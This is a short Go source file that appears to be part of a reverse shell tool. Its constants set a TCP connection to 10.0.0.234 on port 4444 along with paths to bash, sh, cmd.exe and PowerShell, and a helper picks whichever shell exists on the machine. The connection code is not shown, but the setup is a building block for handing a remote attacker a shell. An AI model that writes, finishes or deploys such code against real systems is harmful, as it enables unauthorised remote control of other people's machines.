package main

import (
	"os"
)

const (
	protocol = "tcp"
	ip = "10.0.0.234"
	port = "4444"
	bash = "/bin/bash"
	sh = "/bin/sh"
	commandPrompt = "C:\\Windows\\System32\\cmd.exe"
	powerShell    = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
)

func getSystemShell() string {
	if exists(bash){
		return bash
	}
	if exists(sh){
		return sh
	}
	if exists(commandPrompt) {
		return commandPrompt
	}
	if exists(powerShell){
		return powerShell
	}
	return ""
}

func exists(path string) bool {
	_, err := os.Stat(path)
	if err == nil {
		return true
	}
	if os.IsNotExist(err) {
		return false
	}
	return true
}